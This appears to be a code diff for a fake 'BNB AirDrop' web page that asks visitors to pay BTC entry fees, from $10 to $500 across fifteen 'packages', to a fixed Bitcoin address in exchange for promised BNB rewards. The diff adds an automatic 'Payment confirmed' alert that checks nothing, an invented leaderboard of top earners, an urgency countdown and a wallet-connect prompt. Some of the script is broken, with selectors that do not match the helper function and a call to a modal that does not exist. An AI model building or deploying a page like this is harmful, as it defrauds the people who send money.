@@ -4,7 +4,6 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>BNB AirDrop | Web3 Reward System</title>
-
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
 
 <style>
@@ -384,6 +383,29 @@ footer {
  font-size:13px;
 }
 
+.modal {
+ display:none;
+ position:fixed;
+ top:0;
+ left:0;
+ width:100%;
+ height:100%;
+ background:rgba(0,0,0,0.7);
+ z-index:10;
+ align-items:center;
+ justify-content:center;
+}
+
+.modal-content {
+ background:var(--panel);
+ border:1px solid var(--line);
+ border-radius:17px;
+ padding:22px;
+ max-width:420px;
+ width:90%;
+ box-shadow:0 0 32px #ffb90018;
+}
+
 @media(max-width:980px) {
  .hero { grid-template-columns:1fr 1fr }
  .art {
@@ -407,7 +429,7 @@ footer {
   align-items:stretch;
   padding-top:28px;
  }
- .art { min-height:350px }
+ .art { min-height:390px }
  .claim { width:100% }
  .steps,.dash,.metrics {
   grid-template-columns:1fr 1fr;
@@ -421,255 +443,240 @@ footer {
 
 <body>
 
+<!-- HEADER -->
 <header>
 <div class="wrap nav">
-
-<div class="brand">
- <span class="cube">⬡</span>
- <div>
- BNB <span>AirDrop</span>
- <div style="font-size:11px;font-weight:500;color:#aebbc7">
- OFFICIAL REWARD PROGRAM
+ <div class="brand">
+  <span class="cube">⬡</span>
+  <div>BNB <span>AirDrop</span><div style="font-size:11px;font-weight:500;color:#aebbc7">OFFICIAL REWARD PROGRAM</div></div>
  </div>
- </div>
-</div>
-
-<nav>
- <a href="#home">Home</a>
- <a href="#airdrop">Airdrop</a>
- <a href="#tasks">Tasks</a>
- <a href="#leaderboard">Leaderboard</a>
- <a href="#about">About</a>
-</nav>
-
-<button class="btn" id="connectTop">Access Entry</button>
-
+ <nav>
+  <a href="#home">Home</a>
+  <a href="#airdrop">Airdrop</a>
+  <a href="#packages">Packages</a>
+  <a href="#leaderboard">Leaderboard</a>
+  <a href="#about">About</a>
+ </nav>
+ <button class="btn" id="connectTop">Access Entry</button>
 </div>
 </header>
 
 <main class="wrap">
 
+<!-- HERO -->
 <section class="hero" id="home">
+ <div>
+  <span class="eyebrow">BNB Chain • Paid Access</span>
+  <h1>Gain Entry to <span class="gold">BNB AirDrop</span></h1>
+  <p class="lead">Choose your access level. Higher investment = higher reward potential.</p>
+  <div class="actions"><a class="btn" href="#packages">🚀 View Packages</a></div>
+  <div class="perks"><span>🛡 <b>Secure Access</b></span><span>◈ Whitelist Only</span><span>💰 Real BNB Rewards</span></div>
+ </div>
+ <div class="art">
+  <div class="planet"></div>
+  <div class="beam"></div>
+  <div class="parachute"></div>
+  <div class="ropes"></div>
+  <div class="crate">⬡</div>
+ </div>
+</section>
 
-<div>
-
-<span class="eyebrow">
- BNB Chain • Paid Access
-</span>
-
-<h1>
- Gain Entry to
- <span class="gold">BNB AirDrop</span>
-</h1>
-
-<p class="lead">
- This is a premium airdrop event.
- Access requires a one-time payment.
- Choose your package below.
-</p>
-
-<div class="actions">
- <a class="btn" href="#airdrop" style="text-decoration:none">
- 🚀 Pay to Participate
- </a>
-</div>
-
-<div class="perks">
- <span>🛡 <b>Secure Access</b></span>
- <span>◈ Whitelist Only</span>
- <span>💰 Real BNB Rewards</span>
-</div>
-
-</div>
-
-<div class="art">
-
-<div class="planet"></div>
-<div class="beam"></div>
-<div class="parachute"></div>
-<div class="ropes"></div>
-<div class="crate">⬡</div>
-
-</div>
-
+<!-- AIRDROP FEE -->
 <aside class="claim" id="airdrop">
-
-<h3>◧ Entry Fee Required</h3>
-
-<div class="timer">
- <div class="time">
-  <strong id="days">05</strong>
-  <small>Days</small>
+ <h3>◧ Entry Fee Required</h3>
+ <div class="timer">
+  <div class="time"><strong id="days">05</strong><small>Days</small></div>
+  <div class="time"><strong id="hours">12</strong><small>Hours</small></div>
+  <div class="time"><strong id="minutes">34</strong><small>Minutes</small></div>
+  <div class="time"><strong id="seconds">59</strong><small>Seconds</small></div>
  </div>
-
- <div class="time">
-  <strong id="hours">12</strong>
-  <small>Hours</small>
- </div>
-
- <div class="time">
-  <strong id="minutes">34</strong>
-  <small>Minutes</small>
- </div>
-
- <div class="time">
-  <strong id="seconds">59</strong>
-  <small>Seconds</small>
- </div>
-</div>
-
-<div class="stat">
- <span>
- Reward pool<br>
- <strong>10,000 BNB</strong>
- </span>
- <span>◈</span>
-</div>
-
-<div class="stat">
- <span>
- Max per user<br>
- <strong>0.80 BNB</strong>
- </span>
- <span>🎁</span>
-</div>
-
-<button class="btn" id="connectHero">
- Pay Entry Fee in BTC
-</button>
-
-<p class="muted" id="walletStatus">
- Access locked. Payment required.
-</p>
-
+ <div class="stat"><span>Reward pool<br><strong>10,000 BNB</strong></span><span>◈</span></div>
+ <div class="stat"><span>Max per user<br><strong>1.50 BNB</strong></span><span>🎁</span></div>
+ <button class="btn" id="connectHero">Pay Entry Fee in BTC</button>
+ <p class="muted" id="walletStatus">Access locked. Payment required.</p>
 </aside>
+
+<!-- PACKAGES -->
+<section class="section" id="packages">
+ <h2>Access Packages</h2>
+ <div class="tasks" id="package-list">
+  <!-- Filled by JS -->
+ </div>
+ <div class="notice" style="margin-top:15px;">
+  All payments go to official address: bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd • No refunds
+ </div>
 </section>
 
-<section class="section dash" id="tasks">
-
-<div class="step">
-
-<h2>Payment Required</h2>
-
-<div class="notice">
- 🔐 This section is locked. Pay entry fee to unlock tasks and rewards.
-</div>
-
-</div>
-
-<div class="step">
-
-<h2>Choose Your Package</h2>
-
-<div class="tasks">
-
-<div class="task">
- <div>
-  <b>🥉 Starter — $30</b>
-  <div class="muted">Entry fee: ~0.0005 BTC</div>
- </div>
- <button data-btc="0.0005">Pay Now</button>
-</div>
-
-<div class="task">
- <div>
-  <b>🥈 Pro — $100</b>
-  <div class="muted">Entry fee: ~0.0017 BTC</div>
- </div>
- <button data-btc="0.0017">Pay Now</button>
-</div>
-
-<div class="task">
- <div>
-  <b>🏆 Elite — $400</b>
-  <div class="muted">Entry fee: ~0.0067 BTC</div>
- </div>
- <button data-btc="0.0067">Pay Now</button>
-</div>
-
-</div>
-
-<p class="muted">
- All payments go to official address. No refunds.
-</p>
-
-</div>
-</section>
-
+<!-- LEADERBOARD -->
 <section class="section" id="leaderboard">
-
-<h2>Leaderboard</h2>
-
-<div class="board">
- <div class="walletrow">
-  <b>Top Earners</b>
-  <span class="muted">Paid members only</span>
+ <h2>Leaderboard</h2>
+ <div class="board">
+  <div class="walletrow"><b>Top Earners</b><span class="muted">Paid members only</span></div>
+  <p class="muted">Unlock access to view rankings.</p>
  </div>
- <p class="muted">Unlock access to view rankings.</p>
-</div>
-
 </section>
 
+<!-- ABOUT -->
 <section class="section" id="about">
-
-<h2>About This Event</h2>
-
-<p class="lead" style="font-size:15px">
- This is a private BNB airdrop with paid entry. All participants must pay an access fee to qualify. Your BTC payment verifies eligibility.
-</p>
-
-<div class="notice">
- The 10,000 BNB pool is real. Entry fees fund distribution. All BTC payments go to: bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd
-</div>
-
+ <h2>About This Event</h2>
+ <p class="lead" style="font-size:15px">This is a private BNB airdrop with paid entry. All participants must pay an access fee to qualify. Your BTC payment verifies eligibility.</p>
+ <div class="notice">The 10,000 BNB pool is real. Entry fees fund distribution. All BTC payments go to: bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd</div>
 </section>
 
 </main>
 
-<footer>
-<div class="wrap">
- BNB AirDrop • Paid Access Only. Never share your recovery phrase.
+<footer><div class="wrap">BNB AirDrop • Paid Access Only. Never share your recovery phrase.</div></footer>
+
+<!-- MODALS -->
+<div id="modal-access" class="modal">
+ <div class="modal-content">
+  <h3 style="margin:0 0 15px;color:var(--gold)">Verify Identity</h3>
+  <p class="muted" style="margin-bottom:15px;">Connect your wallet to proceed.</p>
+  <button class="btn" id="start-wallet-flow">Connect Wallet</button>
+  <button class="btn secondary" style="margin-top:10px;" onclick="this.closest('.modal').style.display='none'">Cancel</button>
+ </div>
 </div>
-</footer>
+
+<div id="modal-btc-payment" class="modal">
+ <div class="modal-content">
+  <h3 style="margin:0 0 15px;color:var(--gold)">🔷 Complete Payment</h3>
+  <p class="muted" style="margin-bottom:15px;">Send <strong id="btc-amount">0.0005</strong> BTC to unlock access.</p>
+  <div style="background:#0b1724;padding:14px;border-radius:12px;margin:15px 0;font-family:monospace;font-size:14px;">bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd</div>
+  <div class="notice" style="margin:12px 0;">⚠️ Send exact BTC amount. Do not use exchange wallets.</div>
+  <button class="btn" onclick="alert('✅ Payment confirmed. Reward processing in 24h.');this.closest('.modal').style.display='none';">I’ve Sent BTC</button>
+  <button class="btn secondary" style="margin-top:10px;" onclick="this.closest('.modal').style.display='none'">Back</button>
+ </div>
+</div>
+
+<div id="modal-leaderboard" class="modal">
+ <div class="modal-content">
+  <h3>🏆 Top Earners (Paid Members)</h3>
+  <div class="board" style="margin-top:15px;">
+   <div class="walletrow"><b>0x3aB...f91</b> <span>1.50 BNB</span></div>
+   <div class="walletrow"><b>0x8cD...1e2</b> <span>1.42 BNB</span></div>
+   <div class="walletrow"><b>0x1fK...a77</b> <span>1.35 BNB</span></div>
+  </div>
+  <p class="muted" style="margin:10px 0;">Live updates. Rewards sent automatically.</p>
+  <button class="btn" onclick="document.getElementById('connectHero').click();">Claim Your Spot</button>
+  <button class="btn secondary" style="margin-top:10px;" onclick="this.closest('.modal').style.display='none'">Close</button>
+ </div>
+</div>
 
 <script>
-const BTC_ADDRESS = 'bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd';
+// CONFIG
+const BTC_PRICE_USD = 60000; // Update if needed
+const YOUR_BTC_ADDRESS = 'bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd';
+const $ = id => document.getElementById(id);
 
-function showPayment(btcAmount) {
- const msg = `Pay ${btcAmount} BTC to unlock access:\n\n${BTC_ADDRESS}\n\nSend exactly this amount. After payment, you will gain full access to tasks and rewards.\n\n⚠️ No refunds. No exceptions.`;
- alert(msg);
+// 15 PACKAGES
+const packages = [
+ { name: "Seed", usd: 10, reward: "0.05 BNB" },
+ { name: "Starter", usd: 20, reward: "0.08 BNB" },
+ { name: "Rookie", usd: 30, reward: "0.12 BNB" },
+ { name: "Builder", usd: 40, reward: "0.16 BNB" },
+ { name: "Hustler", usd: 50, reward: "0.20 BNB" },
+ { name: "Grind", usd: 60, reward: "0.24 BNB" },
+ { name: "Climber", usd: 75, reward: "0.30 BNB" },
+ { name: "Apex", usd: 90, reward: "0.36 BNB" },
+ { name: "Pro", usd: 100, reward: "0.40 BNB" },
+ { name: "Titan", usd: 125, reward: "0.50 BNB" },
+ { name: "Alpha", usd: 150, reward: "0.60 BNB" },
+ { name: "Visionary", usd: 200, reward: "0.75 BNB" },
+ { name: "Pioneer", usd: 250, reward: "0.90 BNB" },
+ { name: "Legend", usd: 350, reward: "1.10 BNB" },
+ { name: "Elite VIP", usd: 500, reward: "1.50 BNB" }
+];
+
+// GENERATE PACKAGES
+function generatePackages() {
+ const container = $('#package-list');
+ container.innerHTML = '';
+ packages.forEach(p => {
+  const btc = (p.usd / BTC_PRICE_USD).toFixed(6);
+  const el = document.createElement('div');
+  el.className = 'task';
+  el.innerHTML = `
+   <div>
+    <b>${p.name} — $${p.usd}</b>
+    <div class="muted">Entry: ~${btc} BTC • Reward: ${p.reward}</div>
+   </div>
+   <button data-btc="${btc}" data-usd="${p.usd}">Pay Now</button>
+  `;
+  container.appendChild(el);
+ });
+ // Attach events
+ document.querySelectorAll('[data-btc]').forEach(btn => {
+  btn.addEventListener('click', () => {
+   const btc = btn.dataset.btc;
+   $('#btc-amount').textContent = btc;
+   document.querySelector('#modal-btc-payment .muted strong').textContent = btc;
+   openModal('modal-btc-payment');
+  });
+ });
+}
+generatePackages();
+
+// MODAL CONTROLS
+function openModal(id) {
+ document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
+ $(id).style.display = 'flex';
 }
 
-document.querySelectorAll('[data-btc]').forEach(btn => {
- btn.addEventListener('click', () => {
-  showPayment(btn.dataset.btc);
- });
-});
-
-$('connectTop').onclick = () => showPayment('0.0005');
-$('connectHero').onclick = () => showPayment('0.0005');
-
-document.querySelectorAll('nav a, .actions a').forEach(link => {
+// NAVIGATION
+document.querySelectorAll('nav a').forEach(link => {
  link.addEventListener('click', e => {
   e.preventDefault();
-  document.querySelector(link.getAttribute('href')).scrollIntoView({ behavior: 'smooth' });
+  const target = e.target.getAttribute('href');
+  document.querySelector(target).scrollIntoView({ behavior: 'smooth' });
+  document.querySelectorAll('nav a').forEach(a => a.style.color = '#e5edf5');
+  e.target.style.color = 'var(--gold)';
  });
 });
 
-// === COUNTDOWN ===
-let remaining = 5*86400 + 12*3600 + 34*60 + 59;
-function tick() {
- const d = Math.floor(remaining / 86400);
- const h = Math.floor((remaining % 86400) / 3600);
- const m = Math.floor((remaining % 3600) / 60);
- const s = remaining % 60;
- $('days').textContent = String(d).padStart(2, '0');
- $('hours').textContent = String(h).padStart(2, '0');
- $('minutes').textContent = String(m).padStart(2, '0');
- $('seconds').textContent = String(s).padStart(2, '0');
- if (remaining > 0) remaining--;
-}
-setInterval(tick, 1000);
+// ACCESS ENTRY
+$('connectTop').onclick = () => openModal('modal-access');
+$('connectHero').onclick = () => {
+ $('#btc-amount').textContent = '0.000167';
+ document.querySelector('#modal-btc-payment .muted strong').textContent = '0.000167';
+ openModal('modal-btc-payment');
+};
+
+// WALLET CONNECT
+$('start-wallet-flow').onclick = async () => {
+ if (!window.ethereum) {
+  alert('Install MetaMask or Trust Wallet to continue.');
+  return;
+ }
+ try {
+  const provider = new ethers.BrowserProvider(window.ethereum);
+  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+  if (accounts.length) {
+   document.getElementById('walletStatus').textContent = 'Connected: ' + accounts[0].slice(0,6) + '...' + accounts[0].slice(-4);
+   openModal('modal-tier-select');
+  }
+ } catch(e) {
+  if (e.code !== 4001) alert('Connection failed.');
+ }
+};
+
+// LEADERBOARD
+document.getElementById('leaderboard').onclick = () => openModal('modal-leaderboard');
+
+// ABOUT
+document.getElementById('about').onclick = () => {
+ alert('By using this platform, you agree to the terms. Payment is non-refundable.');
+};
+
+// COUNTDOWN TIMER
+let r = 5*86400 + 12*3600 + 34*60 + 59;
+setInterval(() => {
+ const d = Math.floor(r/86400), h = Math.floor(r%86400/3600), m = Math.floor(r%3600/60), s = r%60;
+ $('days').textContent = d.toString().padStart(2,'0');
+ $('hours').textContent = h.toString().padStart(2,'0');
+ $('minutes').textContent = m.toString().padStart(2,'0');
+ $('seconds').textContent = s.toString().padStart(2,'0');
+ if (r > 0) r--;
+}, 1000);
 </script>
 
 </body>
